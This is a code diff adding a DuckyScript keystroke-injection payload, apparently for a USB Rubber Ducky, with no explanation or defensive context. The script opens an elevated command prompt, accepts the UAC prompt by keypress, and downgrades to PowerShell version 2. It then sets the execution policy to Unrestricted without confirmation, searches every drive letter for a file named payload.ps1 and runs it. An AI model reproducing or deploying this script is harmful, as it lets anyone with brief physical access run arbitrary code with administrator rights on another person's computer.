@@ -1,0 +1,18 @@
+DELAY 5000
+GUI d
+GUI r 
+DELAY 750  
+STRING powershell -noprofile Start-Process cmd -Verb runAs 
+ENTER
+DELAY 750  
+ALT y 
+DELAY 1000
+STRING powershell -version 2 -noexit -noprofile Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false
+ENTER
+DELAY 500
+STRING $alpha = 'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'
+ENTER
+STRING Do{$alpha | %{$DuckyTest = "$_`:\payload.ps1"; if(test-path $DuckyTest){$DuckyScript = $DuckyTest}}}While(!($DuckyScript))
+ENTER 
+STRING & $DuckyScript
+ENTER
